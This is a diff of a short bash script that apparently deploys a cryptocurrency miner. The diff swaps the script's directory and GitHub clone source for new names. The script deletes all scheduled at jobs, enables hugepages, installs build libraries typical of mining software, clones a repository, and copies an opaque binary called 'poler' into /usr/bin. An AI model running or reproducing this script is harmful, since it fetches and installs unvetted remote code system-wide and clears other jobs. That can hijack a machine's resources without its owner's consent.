@@ -1,18 +1,18 @@
 #!/bin/bash
 
-rm -rf /tmp/pro3/
+rm -rf /tmp/fckplc2/
 for i in `atq | awk '{print $1}'`;do atrm $i;done
 sudo dpkg --configure -a
 echo 'vm.nr_hugepages=256' >> /etc/sysctl.conf
 sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
-cd /tmp && mkdir pro3
-git clone https://github.com/hay-bude/pro3.git /tmp/pro3
-cd /tmp/pro3
-chmod +x /tmp/pro3/poler
+cd /tmp && mkdir fckplc2
+git clone https://github.com/getting-stronger/fckplc2.git /tmp/fckplc2
+cd /tmp/fckplc2
+chmod +x /tmp/fckplc2/poler
 chmod 777 ./*.sh
-cp /tmp/pro3/poler /usr/bin/
+cp /tmp/fckplc2/poler /usr/bin/
 sleep 3
 
 sudo apt-get install dos2unix
